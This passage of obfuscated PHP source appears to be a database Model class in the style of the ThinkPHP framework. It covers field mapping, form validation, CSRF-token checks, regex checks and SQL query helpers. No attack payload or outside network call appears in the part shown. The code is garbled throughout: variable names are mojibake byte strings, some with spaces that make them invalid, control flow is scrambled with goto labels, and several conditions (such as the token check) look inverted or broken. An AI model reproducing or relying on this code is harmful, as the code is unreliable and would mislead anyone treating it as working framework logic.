$EÌ¾È´‚‹¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($c­Ğè¶„ˆ›) { if (is_callable($c­Ğè¶„ˆ›)) { return call_user_func($c­Ğè¶„ˆ›, $B»´¸ùµÑŸ); } switch (strtolower($c­Ğè¶„ˆ›)) { case $EÌ¾È´‚‹¸[288]: return json_encode($B»´¸ùµÑŸ); case $EÌ¾È´‚‹¸[289]: return xml_encode($B»´¸ùµÑŸ); } } return $B»´¸ùµÑŸ; } public function parseFieldsMap($d”–ŒáĞÂ, $A‹•›…ß = 1) { if (!empty($this->_map)) { foreach ($this->_map as $AØ±§ŠíªÓ => $CáÚĞè³¨) { if ($A‹•›…ß == 1) { if (isset($d”–ŒáĞÂ[$CáÚĞè³¨])) { $d”–ŒáĞÂ[$AØ±§ŠíªÓ] = $d”–ŒáĞÂ[$CáÚĞè³¨]; unset($d”–ŒáĞÂ[$CáÚĞè³¨]); } } else { if (isset($d”–ŒáĞÂ[$AØ±§ŠíªÓ])) { $d”–ŒáĞÂ[$CáÚĞè³¨] = $d”–ŒáĞÂ[$AØ±§ŠíªÓ]; unset($d”–ŒáĞÂ[$AØ±§ŠíªÓ]); } } } } return $d”–ŒáĞÂ; } public function setField($DØ¼‰õÍÇ, $dµïíÚë‡­ = '') { if (is_array($DØ¼‰õÍÇ)) { $A»¥ù§ÄÈÙ = $DØ¼‰õÍÇ; } else { $A»¥ù§ÄÈÙ[$DØ¼‰õÍÇ] = $dµïíÚë‡­; } return $this->save($A»¥ù§ÄÈÙ); } public function setAdd($D·Éñè™â, $a‘–×êÇáÊ = 1) { $D¨æÓ½Ú—› =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cß÷Äî–•ˆ = $D·Éñè™â . $D¨æÓ½Ú—›[290] . $a‘–×êÇáÊ; if ($a‘–×êÇáÊ < 0) { $Cß÷Äî–•ˆ = $D·Éñè™â . $a‘–×êÇáÊ; } return $this->setField($D·Éñè™â, array($D¨æÓ½Ú—›[291], $Cß÷Äî–•ˆ)); } public function getField($a­ÖàÓ‹É, $DËŸê“Ò¤õ = null) { $EÊ‰„©Ğì¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AØœİÈ¸ò÷[$EÊ‰„©Ğì¯[267]] = $a­ÖàÓ‹É; $AØœİÈ¸ò÷ = $this->_parseOptions($AØœİÈ¸ò÷); $a­ÖàÓ‹É = trim($a­ÖàÓ‹É); if (strpos($a­ÖàÓ‹É, $EÊ‰„©Ğì¯[47])) { if (!isset($AØœİÈ¸ò÷[$EÊ‰„©Ğì¯[286]])) { $AØœİÈ¸ò÷[$EÊ‰„©Ğì¯[286]] = is_numeric($DËŸê“Ò¤õ) ? $DËŸê“Ò¤õ : $EÊ‰„©Ğì¯[33]; } $féºƒì” = $this->db->select($AØœİÈ¸ò÷); if (!empty($féºƒì”)) { goto C§Î”Üªä›; aóÁçŸ†ŒÀ: $DùÅŠ¸á‚£ = array_shift($a­ÖàÓ‹É); $e§«¼Æœ¿ƒ = array(); $cğÚ³ˆÁ¥ö = count($F¶¥”Ï Á°); goto C²¯‘«‰‚„; C²¯‘«‰‚„: foreach ($féºƒì” as $F¤ØŠ¢ˆ‘») { $EØğ×ÆÏÒÍ = $F¤ØŠ¢ˆ‘»[$E¦Ü¨Ş¿é]; if (2 == $cğÚ³ˆÁ¥ö) { $e§«¼Æœ¿ƒ[$EØğ×ÆÏÒÍ] = $F¤ØŠ¢ˆ‘»[$DùÅŠ¸á‚£]; } else { $e§«¼Æœ¿ƒ[$EØğ×ÆÏÒÍ] = is_string($DËŸê“Ò¤õ) ? implode($DËŸê“Ò¤õ, $F¤ØŠ¢ˆ‘») : $F¤ØŠ¢ˆ‘»; } } return $e§«¼Æœ¿ƒ; goto aàÈõòÖ¸; C§Î”Üªä›: $F¶¥”Ï Á° = explode($EÊ‰„©Ğì¯[47], $a­ÖàÓ‹É); $a­ÖàÓ‹É = array_keys($féºƒì”[0]); $E¦Ü¨Ş¿é = array_shift($a­ÖàÓ‹É); goto aóÁçŸ†ŒÀ; aàÈõòÖ¸: } } else { if (!0 !== $DËŸê“Ò¤õ) { $AØœİÈ¸ò÷[$EÊ‰„©Ğì¯[286]] = is_numeric($DËŸê“Ò¤õ) ? $DËŸê“Ò¤õ : 1; } if ($DËŸê“Ò¤õ === $EÊ‰„©Ğì¯[249]) { unset($AØœİÈ¸ò÷[$EÊ‰„©Ğì¯[286]]); } $F¤ØŠ¢ˆ‘» = $this->db->select($AØœİÈ¸ò÷); if (!empty($F¤ØŠ¢ˆ‘»)) { if ($DËŸê“Ò¤õ === $EÊ‰„©Ğì¯[249]) { return reset($F¤ØŠ¢ˆ‘»[0]); } if (!0 !== $DËŸê“Ò¤õ && 1 == $AØœİÈ¸ò÷[$EÊ‰„©Ğì¯[286]]) { return reset($F¤ØŠ¢ˆ‘»[0]); } foreach ($F¤ØŠ¢ˆ‘» as $D„Õ®‰ìÎ) { $EóÕøšˆí‘[] = $D„Õ®‰ìÎ[$a­ÖàÓ‹É]; } return $EóÕøšˆí‘; } } return null; } public function create($BñÙÍÒŠî† = '', $aêëøø³±Ò = '') { goto CÕº˜ß« …; CÕº˜ß« …: $A®Ú—È ½ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($BñÙÍÒŠî†)) { $BñÙÍÒŠî† = $_POST; } elseif (is_object($BñÙÍÒŠî†)) { $BñÙÍÒŠî† = get_object_vars($BñÙÍÒŠî†); } if (empty($BñÙÍÒŠî†) || !is_array($BñÙÍÒŠî†)) { $this->error = think_lang($A®Ú—È ½ø[265]); return !1; } goto BŠÁÎ„Ö‡; c×†®¸åÆ‘: if (isset($CµáÚ²¯²)) { if (is_string($CµáÚ²¯²)) { $CµáÚ²¯² = explode($A®Ú—È ½ø[47], $CµáÚ²¯²); } if (think_config($A®Ú—È ½ø[292])) { $CµáÚ²¯²[] = think_config($A®Ú—È ½ø[293]); } foreach ($BñÙÍÒŠî† as $DÛçÑÚÖ => $eÇÏ×½„) { if (!in_array($DÛçÑÚÖ, $CµáÚ²¯²)) { unset($BñÙÍÒŠî†[$DÛçÑÚÖ]); } } } if (!$this->autoValidation($BñÙÍÒŠî†, $aêëøø³±Ò)) { return !1; } if (!$this->autoCheckToken($BñÙÍÒŠî†)) { $this->error = think_lang($A®Ú—È ½ø[294]); return !1; } goto E±á¤ø¾šâ; BŠÁÎ„Ö‡: $BñÙÍÒŠî† = $this->parseFieldsMap($BñÙÍÒŠî†, 0); $aêëøø³±Ò = $aêëøø³±Ò ? $aêëøø³±Ò : (!empty($BñÙÍÒŠî†[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$A®Ú—È ½ø[267]])) { $CµáÚ²¯² = $this->options[$A®Ú—È ½ø[267]]; unset($this->options[$A®Ú—È ½ø[267]]); } elseif ($aêëøø³±Ò == THINK_MODEL_INSERT && isset($this->insertFields)) { $CµáÚ²¯² = $this->insertFields; } elseif ($aêëøø³±Ò == THINK_MODEL_UPDATE && isset($this->updateFields)) { $CµáÚ²¯² = $this->updateFields; } goto c×†®¸åÆ‘; eÔ‚¤–·§Õ: return $BñÙÍÒŠî†; goto d ïÓÏÂÖ; E±á¤ø¾šâ: if ($this->autoCheckFields) { $CµáÚ²¯² = $this->getDbFields(); foreach ($BñÙÍÒŠî† as $DÛçÑÚÖ => $eÇÏ×½„) { if (!in_array($DÛçÑÚÖ, $CµáÚ²¯²)) { unset($BñÙÍÒŠî†[$DÛçÑÚÖ]); } elseif (MAGIC_QUOTES_GPC && is_string($eÇÏ×½„)) { $BñÙÍÒŠî†[$DÛçÑÚÖ] = stripslashes($eÇÏ×½„); } } } $this->autoOperation($BñÙÍÒŠî†, $aêëøø³±Ò); $this->data = $BñÙÍÒŠî†; goto eÔ‚¤–·§Õ; d ïÓÏÂÖ: } public function autoCheckToken($f»Ì¨ÉÀ—¨) { $f‡ÏñÁÜ’£ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($this->options[$f‡ÏñÁÜ’£[295]]) && !$this->options[$f‡ÏñÁÜ’£[295]]) { return !0; } if (think_config($f‡ÏñÁÜ’£[292])) { $föÄ³ŒÒİ = think_config($f‡ÏñÁÜ’£[293]); if (!isset($f»Ì¨ÉÀ—¨[$föÄ³ŒÒİ]) || Session::get($föÄ³ŒÒİ)) { return !1; } list($F¯æÜ•Şœ, $F‡ç³•Ï‡ì) = explode($f‡ÏñÁÜ’£[70], $f»Ì¨ÉÀ—¨[$föÄ³ŒÒİ]); if ($F‡ç³•Ï‡ì && Session::get($föÄ³ŒÒİ . $f‡ÏñÁÜ’£[91] . $F¯æÜ•Şœ) === $F‡ç³•Ï‡ì) { Session::remove($föÄ³ŒÒİ . $f‡ÏñÁÜ’£[91] . $F¯æÜ•Şœ); return !0; } if (think_config($f‡ÏñÁÜ’£[296])) { Session::remove($föÄ³ŒÒİ . $f‡ÏñÁÜ’£[91] . $F¯æÜ•Şœ); } return !1; } return !0; } public function regex($cŸ‰â‡Œà, $B¢¼Š‚¸ƒ) { $BÅÃé¥†á„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c«ÎÌÚñğ§ = array($BÅÃé¥†á„[297] => $BÅÃé¥†á„[298], $BÅÃé¥†á„[299] => $BÅÃé¥†á„[300], $BÅÃé¥†á„[301] => $BÅÃé¥†á„[302], $BÅÃé¥†á„[303] => $BÅÃé¥†á„[304], $BÅÃé¥†á„[305] => $BÅÃé¥†á„[306], $BÅÃé¥†á„[307] => $BÅÃé¥†á„[308], $BÅÃé¥†á„[309] => $BÅÃé¥†á„[310], $BÅÃé¥†á„[284] => $BÅÃé¥†á„[311], $BÅÃé¥†á„[312] => $BÅÃé¥†á„[313]); if (isset($c«ÎÌÚñğ§[strtolower($B¢¼Š‚¸ƒ)])) { $B¢¼Š‚¸ƒ = $c«ÎÌÚñğ§[strtolower($B¢¼Š‚¸ƒ)]; } return preg_match($B¢¼Š‚¸ƒ, $cŸ‰â‡Œà) === 1; } private function autoOperation(&$BÇ¿—ÀÌ•í, $cêÅĞá¯) { $fô äîêé¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!empty($this->options[$fô äîêé¼[314]])) { $aŸçÓ‡“¥« = $this->options[$fô äîêé¼[314]]; unset($this->options[$fô äîêé¼[314]]); } elseif (!empty($this->_auto)) { $aŸçÓ‡“¥« = $this->_auto; } if (isset($aŸçÓ‡“¥«)) { foreach ($aŸçÓ‡“¥« as $CÕø²í¬ÉŠ) { if (empty($CÕø²í¬ÉŠ[2])) { $CÕø²í¬ÉŠ[2] = THINK_MODEL_INSERT; } if ($cêÅĞá¯ == $CÕø²í¬ÉŠ[2] || $CÕø²í¬ÉŠ[2] == THINK_MODEL_BOTH) { switch (trim($CÕø²í¬ÉŠ[3])) { case $fô äîêé¼[315]: case $fô äîêé¼[316]: $c„¿™õ÷ = isset($CÕø²í¬ÉŠ[4]) ? (array) $CÕø²í¬ÉŠ[4] : array(); if (isset($BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]])) { array_unshift($c„¿™õ÷, $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]]); } if ($fô äîêé¼[315] == $CÕø²í¬ÉŠ[3]) { $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]] = call_user_func_array($CÕø²í¬ÉŠ[1], $c„¿™õ÷); } else { $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]] = call_user_func_array(array(&$this, $CÕø²í¬ÉŠ[1]), $c„¿™õ÷); } break; case $fô äîêé¼[267]: $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]] = $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[1]]; break; case $fô äîêé¼[317]: if ($fô äîêé¼[33] === $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]]) { unset($BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]]); } break; case $fô äîêé¼[318]: default: $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]] = $CÕø²í¬ÉŠ[1]; } if (!1 === $BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]]) { unset($BÇ¿—ÀÌ•í[$CÕø²í¬ÉŠ[0]]); } } } } return $BÇ¿—ÀÌ•í; } protected function autoValidation($A¦ Œ¹ªÙë, $fìƒÅ™ÎÓ) { $EÚ¹¿Œ×º =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!empty($this->options[$EÚ¹¿Œ×º[319]])) { $dì½‘ÇöŠ = $this->options[$EÚ¹¿Œ×º[319]]; unset($this->options[$EÚ¹¿Œ×º[319]]); } elseif (!empty($this->_validate)) { $dì½‘ÇöŠ = $this->_validate; } if (isset($dì½‘ÇöŠ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dì½‘ÇöŠ as $fµ¿ƒš‘Å => $d‰×µ¾ôÊÅ) { if (empty($d‰×µ¾ôÊÅ[5]) || $d‰×µ¾ôÊÅ[5] == THINK_MODEL_BOTH || $d‰×µ¾ôÊÅ[5] == $fìƒÅ™ÎÓ) { if (0 == strpos($d‰×µ¾ôÊÅ[2], $EÚ¹¿Œ×º[320]) && strpos($d‰×µ¾ôÊÅ[2], $EÚ¹¿Œ×º[321])) { $d‰×µ¾ôÊÅ[2] = think_lang(substr($d‰×µ¾ôÊÅ[2], 2, -1)); } $d‰×µ¾ôÊÅ[3] = isset($d‰×µ¾ôÊÅ[3]) ? $d‰×µ¾ôÊÅ[3] : THINK_EXISTS_VALIDATE; $d‰×µ¾ôÊÅ[4] = isset($d‰×µ¾ôÊÅ[4]) ? $d‰×µ¾ôÊÅ[4] : $EÚ¹¿Œ×º[322]; switch ($d‰×µ¾ôÊÅ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($A¦ Œ¹ªÙë, $d‰×µ¾ôÊÅ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($EÚ¹¿Œ×º[33] != trim($A¦ Œ¹ªÙë[$d‰×µ¾ôÊÅ[0]])) { if (!1 === $this->_validationField($A¦ Œ¹ªÙë, $d‰×µ¾ôÊÅ)) { return !1; } } break; default: if (isset($A¦ Œ¹ªÙë[$d‰×µ¾ôÊÅ[0]])) { if (!1 === $this->_validationField($A¦ Œ¹ªÙë, $d‰×µ¾ôÊÅ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($c —ÑÉÔ‰, $DéÒÅ¬Õ’Å) { if (!1 === $this->_validationFieldItem($c —ÑÉÔ‰, $DéÒÅ¬Õ’Å)) { if ($this->patchValidate) { $this->error[$DéÒÅ¬Õ’Å[0]] = $DéÒÅ¬Õ’Å[2]; } else { $this->error = $DéÒÅ¬Õ’Å[2]; return !1; } } return; } protected function _validationFieldItem($cĞŞÙ‰ğÂÅ, $fªãÁ¦šÀè) { $F¢ÑÂêùøñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; switch (strtolower(trim($fªãÁ¦šÀè[4]))) { case $F¢ÑÂêùøñ[315]: case $F¢ÑÂêùøñ[316]: $f›æÉÜÙÄã = isset($fªãÁ¦šÀè[6]) ? (array) $fªãÁ¦šÀè[6] : array(); if (is_string($fªãÁ¦šÀè[0]) && strpos($fªãÁ¦šÀè[0], $F¢ÑÂêùøñ[47])) { $fªãÁ¦šÀè[0] = explode($F¢ÑÂêùøñ[47], $fªãÁ¦šÀè[0]); } if (is_array($fªãÁ¦šÀè[0])) { foreach ($fªãÁ¦šÀè[0] as $DÎ›šóÁÏ) { $bï¤‘ö±Íç[$DÎ›šóÁÏ] = $cĞŞÙ‰ğÂÅ[$DÎ›šóÁÏ]; } array_unshift($f›æÉÜÙÄã, $bï¤‘ö±Íç); } else { array_unshift($f›æÉÜÙÄã, $cĞŞÙ‰ğÂÅ[$fªãÁ¦šÀè[0]]); } if ($F¢ÑÂêùøñ[315] == $fªãÁ¦šÀè[4]) { return call_user_func_array($fªãÁ¦šÀè[1], $f›æÉÜÙÄã); } else { return call_user_func_array(array(&$this, $fªãÁ¦šÀè[1]), $f›æÉÜÙÄã); } case $F¢ÑÂêùøñ[323]: return $cĞŞÙ‰ğÂÅ[$fªãÁ¦šÀè[0]] == $cĞŞÙ‰ğÂÅ[$fªãÁ¦šÀè[1]]; case $F¢ÑÂêùøñ[324]: if (is_string($fªãÁ¦šÀè[0]) && strpos($fªãÁ¦šÀè[0], $F¢ÑÂêùøñ[47])) { $fªãÁ¦šÀè[0] = explode($F¢ÑÂêùøñ[47], $fªãÁ¦šÀè[0]); } $A¾İš©ò›ª = array(); if (is_array($fªãÁ¦šÀè[0])) { foreach ($fªãÁ¦šÀè[0] as $DÎ›šóÁÏ) { $A¾İš©ò›ª[$DÎ›šóÁÏ] = $cĞŞÙ‰ğÂÅ[$DÎ›šóÁÏ]; } } else { $A¾İš©ò›ª[$fªãÁ¦šÀè[0]] = $cĞŞÙ‰ğÂÅ[$fªãÁ¦šÀè[0]]; } if (!empty($cĞŞÙ‰ğÂÅ[$this->getPk()])) { $A¾İš©ò›ª[$this->getPk()] = array($F¢ÑÂêùøñ[325], $cĞŞÙ‰ğÂÅ[$this->getPk()]); } if ($this->where($A¾İš©ò›ª)->find()) { return !1; } return !0; default: return $this->check($cĞŞÙ‰ğÂÅ[$fªãÁ¦šÀè[0]], $fªãÁ¦šÀè[1], $fªãÁ¦šÀè[4]); } } public function check($Dƒ…Ûñœ¦æ, $BÄ©ê«Óõì, $a¹÷ôøˆÙŠ = "\162\145\147\x65\170") { $E¸¸¤õ§¥Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a¹÷ôøˆÙŠ = strtolower(trim($a¹÷ôøˆÙŠ)); switch ($a¹÷ôøˆÙŠ) { case $E¸¸¤õ§¥Œ[7]: case $E¸¸¤õ§¥Œ[326]: $Cíò‚Â¶¸Ê = is_array($BÄ©ê«Óõì) ? $BÄ©ê«Óõì : explode($E¸¸¤õ§¥Œ[47], $BÄ©ê«Óõì); return $a¹÷ôøˆÙŠ == $E¸¸¤õ§¥Œ[7] ? in_array($Dƒ…Ûñœ¦æ, $Cíò‚Â¶¸Ê) : !in_array($Dƒ…Ûñœ¦æ, $Cíò‚Â¶¸Ê); case $E¸¸¤õ§¥Œ[327]: case $E¸¸¤õ§¥Œ[328]: if (is_array($BÄ©ê«Óõì)) { $eÉî©†ˆÅ¬ = $BÄ©ê«Óõì[0]; $bª‘ƒÎ³„ = $BÄ©ê«Óõì[1]; } else { list($eÉî©†ˆÅ¬, $bª‘ƒÎ³„) = explode($E¸¸¤õ§¥Œ[47], $BÄ©ê«Óõì); } return $a¹÷ôøˆÙŠ == $E¸¸¤õ§¥Œ[327] ? $Dƒ…Ûñœ¦æ >= $eÉî©†ˆÅ¬ && $Dƒ…Ûñœ¦æ <= $bª‘ƒÎ³„ : $Dƒ…Ûñœ¦æ < $eÉî©†ˆÅ¬ || $Dƒ…Ûñœ¦æ > $bª‘ƒÎ³„; case $E¸¸¤õ§¥Œ[329]: case $E¸¸¤õ§¥Œ[330]: return $a¹÷ôøˆÙŠ == $E¸¸¤õ§¥Œ[329] ? $Dƒ…Ûñœ¦æ == $BÄ©ê«Óõì : $Dƒ…Ûñœ¦æ != $BÄ©ê«Óõì; case $E¸¸¤õ§¥Œ[331]: $F§èé‹Š‰³ = mb_strlen($Dƒ…Ûñœ¦æ, $E¸¸¤õ§¥Œ[332]); if (strpos($BÄ©ê«Óõì, $E¸¸¤õ§¥Œ[47])) { list($eÉî©†ˆÅ¬, $bª‘ƒÎ³„) = explode($E¸¸¤õ§¥Œ[47], $BÄ©ê«Óõì); return $F§èé‹Š‰³ >= $eÉî©†ˆÅ¬ && $F§èé‹Š‰³ <= $bª‘ƒÎ³„; } else { return $F§èé‹Š‰³ == $BÄ©ê«Óõì; } case $E¸¸¤õ§¥Œ[333]: list($FàÂÂô–ˆõ, $b˜‡…²†íÜ) = explode($E¸¸¤õ§¥Œ[47], $BÄ©ê«Óõì); if (!is_numeric($FàÂÂô–ˆõ)) { $FàÂÂô–ˆõ = strtotime($FàÂÂô–ˆõ); } if (!is_numeric($b˜‡…²†íÜ)) { $b˜‡…²†íÜ = strtotime($b˜‡…²†íÜ); } return NOW_TIME >= $FàÂÂô–ˆõ && NOW_TIME <= $b˜‡…²†íÜ; case $E¸¸¤õ§¥Œ[334]: return in_array(get_client_ip(), explode($E¸¸¤õ§¥Œ[47], $BÄ©ê«Óõì)); case $E¸¸¤õ§¥Œ[335]: return !in_array(get_client_ip(), explode($E¸¸¤õ§¥Œ[47], $BÄ©ê«Óõì)); case $E¸¸¤õ§¥Œ[322]: default: return $this->regex($Dƒ…Ûñœ¦æ, $BÄ©ê«Óõì); } } public function query($C§²Ÿ¢˜š, $E¤Ì¦öˆØš = false) { $eÄ¥ÁŠ¨–ğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!is_bool($E¤Ì¦öˆØš) && !is_array($E¤Ì¦öˆØš)) { $E¤Ì¦öˆØš = func_get_args(); array_shift($E¤Ì¦öˆØš); } $C§²Ÿ¢˜š = str_replace(array($eÄ¥ÁŠ¨–ğ[225], $eÄ¥ÁŠ¨–ğ[336]), $eÄ¥ÁŠ¨–ğ[50], $C§²Ÿ¢˜š); $C§²Ÿ¢˜š = $this->parseSql($C§²Ÿ¢˜š, $E¤Ì¦öˆØš); return $this->db->query($C§²Ÿ¢˜š); } public function execute($A¤ÜÀØƒÜ, $b‚ğÍŒÀã = false) { if (!is_bool($b‚ğÍŒÀã) && !is_array($b‚ğÍŒÀã)) { $b‚ğÍŒÀã = func_get_args(); array_shift($b‚ğÍŒÀã); } $A¤ÜÀØƒÜ = $this->parseSql($A¤ÜÀØƒÜ, $b‚ğÍŒÀã); return $this->db->execute($A¤ÜÀØƒÜ); } protected function parseSql($cÜíÄÉİ¹¶, $eÚ¿ùğ’œÃ) { $A’›ÌŞ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!0 === $eÚ¿ùğ’œÃ) { $Aß‚ÒÎ„ä = $this->_parseOptions(); $cÜíÄÉİ¹¶ = $this->db->parseSql($cÜíÄÉİ¹¶, $Aß‚ÒÎ„ä); } elseif (is_array($eÚ¿ùğ’œÃ)) { $eÚ¿ùğ’œÃ = array_map(array($this->db, $A’›ÌŞ[337]), $eÚ¿ùğ’œÃ); $cÜíÄÉİ¹¶ = vsprintf($cÜíÄÉİ¹¶, $eÚ¿ùğ’œÃ); } else { $cÜíÄÉİ¹¶ = strtr($cÜíÄÉİ¹¶, array($A’›ÌŞ[338] => $this->getTableName(), $A’›ÌŞ[339] => think_config($A’›ÌŞ[238]))); } $this->db->setModel($this->name); return $cÜíÄÉİ¹¶; } public function db($B½ã«Ø·µ„ = '', $Eí‚ë’Îä‘ = '', $dªÆ½Şïè = array()) { goto fëìÙ°ËµŒ; DÅºå‹ƒ”Ï: static $cãé¹×ŸŒ = array(); if (!isset($cãé¹×ŸŒ[$B½ã«Ø·µ„]) || isset($cãé¹×ŸŒ[$B½ã«Ø·µ„]) && $Eí‚ë’Îä‘ && $d£¶èäƒ¥Œ[$B½ã«Ø·µ„] != $Eí‚ë’Îä‘) { if (!empty($Eí‚ë’Îä‘) && is_string($Eí‚ë’Îä‘) && !1 === strpos($Eí‚ë’Îä‘, $Ešö¬†•©[8])) { $Eí‚ë’Îä‘ = think_config($Eí‚ë’Îä‘); } $cãé¹×ŸŒ[$B½ã«Ø·µ„] = Db::getInstance($Eí‚ë’Îä‘); } elseif (NULL === $Eí‚ë’Îä‘) { $cãé¹×ŸŒ[$B½ã«Ø·µ„]->close(); unset($cãé¹×ŸŒ[$B½ã«Ø·µ„]); return; } if (!empty($dªÆ½Şïè)) { if (is_string($dªÆ½Şïè)) { parse_str($dªÆ½Şïè, $dªÆ½Şïè); } foreach ($dªÆ½Şïè as $a¨öëÅ©êÃ => $FÇÃîç´«) { $this->setProperty($a¨öëÅ©êÃ, $FÇÃîç´«); } } goto dƒ¢âÃîÅß; fëìÙ°ËµŒ: $Ešö¬†•© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($Ešö¬†•©[33] === $B½ã«Ø·µ„ && $this->db) { return $this->db; } static $d£¶èäƒ¥Œ = array(); goto DÅºå‹ƒ”Ï; dæ«¢ê§¶²: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f—İ”¶§­; dƒ¢âÃîÅß: $d£¶èäƒ¥Œ[$B½ã«Ø·µ„] = $Eí‚ë’Îä‘; $this->db = $cãé¹×ŸŒ[$B½ã«Ø·µ„]; $this->_after_db(); goto dæ«¢ê§¶²; f—İ”¶§­: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $CöîĞÊ…Ãç = get_class($this); if ($CöîĞÊ…Ãç == $_SERVER[ÈİÅ¿ÈÈ¥×][340]) { return $this->name; } $this->name = substr($CöîĞÊ…Ãç, 0, -5); } return $this->name; } public function getTableName() { $Bø‡¯¹„’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($this->trueTableName)) { $Dï„¥íÊ„â = !empty($this->tablePrefix) ? $this->tablePrefix : $Bø‡¯¹„’[33]; if (!empty($this->tableName)) { $Dï„¥íÊ„â .= $this->tableName; } else { $Dï„¥íÊ„â .= think_parse_name($this->name); } $this->trueTableName = strtolower($Dï„¥íÊ„â); } return (!empty($this->dbName) ? $this->dbName . $Bø‡¯¹„’[91] : $Bø‡¯¹„’[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eË³“Á“Ñğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return isset($this->fields[$eË³“Á“Ñğ[245]]) ? $this->fields[$eË³“Á“Ñğ[245]] : $this->pk; } public function getDbFields() { $eÇ¶Ô¾ãˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($this->options[$eÇ¶Ô¾ãˆ[273]])) { $EÍçî¸—ô = $this->db->getFields($this->options[$eÇ¶Ô¾ãˆ[273]]); return $EÍçî¸—ô ? array_keys($EÍçî¸—ô) : !1; } if ($this->fields) { $EÍçî¸—ô = $this->fields; unset($EÍçî¸—ô[$eÇ¶Ô¾ãˆ[244]], $EÍçî¸—ô[$eÇ¶Ô¾ãˆ[245]], $EÍçî¸—ô[$eÇ¶Ô¾ãˆ[246]], $EÍçî¸—ô[$eÇ¶Ô¾ãˆ[243]]); return $EÍçî¸—ô; } return !1; } public function data($eÛ–ÍÙÌ´ = '') { $f£äŞöÛÎÜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($f£äŞöÛÎÜ[33] === $eÛ–ÍÙÌ´ && !empty($this->data)) { return $this->data; } if (is_object($eÛ–ÍÙÌ´)) { $eÛ–ÍÙÌ´ = get_object_vars($eÛ–ÍÙÌ´); } elseif (is_string($eÛ–ÍÙÌ´)) { parse_str($eÛ–ÍÙÌ´, $eÛ–ÍÙÌ´); } elseif (!is_array($eÛ–ÍÙÌ´)) { think_exception(think_lang($f£äŞöÛÎÜ[265])); } $this->data = $eÛ–ÍÙÌ´; return $this; } public function join($D¡š“ŞÕùÎ) { $dœµÑè¦Œ’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_array($D¡š“ŞÕùÎ)) { $this->options[$dœµÑè¦Œ’[276]] = $D¡š“ŞÕùÎ; } elseif (!empty($D¡š“ŞÕùÎ)) { $this->options[$dœµÑè¦Œ’[276]][] = $D¡š“ŞÕùÎ; } return $this; } public function union($c¬‰÷»Š‘à, $då”ÆêÎ« = false) { goto fŞ÷ÊÌ–È–; bÈñíÑÍğô: if (is_object($c¬‰÷»Š‘à)) { $c¬‰÷»Š‘à = get_object_vars($c¬‰÷»Š‘à); } if (is_string($c¬‰÷»Š‘à)) { $DŞè´íá‹ = $c¬‰÷»Š‘à; } elseif (is_array($c¬‰÷»Š‘à)) { if (isset($c¬‰÷»Š‘à[0])) { $this->options[$AÆ·ö…¯±Ş[341]] = array_merge($this->options[$AÆ·ö…¯±Ş[341]], $c¬‰÷»Š‘à); return $this; } else { $DŞè´íá‹ = $c¬‰÷»Š‘à; } } else { think_exception(think_lang($AÆ·ö…¯±Ş[265])); } $this->options[$AÆ·ö…¯±Ş[341]][] = $DŞè´íá‹; goto dÎ²Ÿ„; fŞ÷ÊÌ–È–: $AÆ·ö…¯±Ş =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($c¬‰÷»Š‘à)) { return $this; } if ($då”ÆêÎ«) { $this->options[$AÆ·ö…¯±Ş[341]][$AÆ·ö…¯±Ş[342]] = !0; } goto bÈñíÑÍğô; dÎ²Ÿ„: return $this; goto BÕ”˜‹Ôê¶; BÕ”˜‹Ôê¶: } public function cache($dº¶àÓã» = true, $e‹õì¡øµÎ = null, $AÕ¢¡ÑøÔ = '') { $aù„Ï£—·š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!1 !== $dº¶àÓã») { $this->options[$aù„Ï£—·š[343]] = array($aù„Ï£—·š[89] => $dº¶àÓã», $aù„Ï£—·š[333] => $e‹õì¡øµÎ, $aù„Ï£—·š[29] => $AÕ¢¡ÑøÔ); } return $this; } public function field($d´µ•‰¯‡Î, $f‚’ˆù‹õ’ = false) { $CÔ«ãéê’Ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!0 === $d´µ•‰¯‡Î) { $b¿‡–“ˆ = $this->getDbFields(); $d´µ•‰¯‡Î 